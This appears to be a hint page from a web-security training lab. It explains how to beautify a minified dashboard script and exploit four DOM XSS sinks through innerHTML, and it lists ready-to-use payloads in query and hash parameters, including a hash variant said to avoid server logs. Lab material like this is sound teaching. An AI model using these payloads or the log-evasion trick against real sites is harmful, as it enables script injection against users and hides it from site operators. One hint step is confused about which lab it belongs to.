Hint: CoreDash (Minified — 4 Sinks)

Copy dashboard-core.min.js into a beautifier (prettier, js-beautify, DevTools "Pretty print"). Then read C.init() — it calls several sinks in a chain.
1
Beautify the code›
In DevTools Sources tab, click the {} icon at the bottom to pretty-print. Or copy the file into prettier.io. Focus on C.init, C.Widget.renderFromURL, C.Notification.showRich, and C.Banner.show.
2
Sink A: notify param → innerHTML›
C.init reads params.notify (URL query) and passes it to Notification.showRich, which does n.innerHTML = html. Payload: ?notify=<img src=x onerror=alert(1)>.
3
Sink B: widget=JSON with html field›
Widget.renderFromURL parses ?widget= as JSON (also tries base64). If config.html is set, it writes it to el.innerHTML. Payload: ?widget={"html":"<img src=x onerror=alert(1)>"} (URL-encode the JSON).
4
Sink C: action=showRich›
C.init allows ?action=<method> to invoke any property on C. Setting action=Notification.showRich won't work directly (it's nested), but Banner.show is also a sink.
5
Sink D: banner via ek-banner (different SDK!)›
Wrong SDK — that's the helpdesk lab. In CoreDash, the hash params map: #notify=<payload> also works because C.Utils.getHash merges into the URL params check.

Easiest:

?notify=<img src=x onerror=alert('XSS')>

Via widget JSON:

?widget=%7B%22html%22%3A%22%3Cimg+src%3Dx+onerror%3Dalert(1)%3E%22%7D

Via hash (bypasses server logs):

#notify=<img src=x onerror=alert(1)>
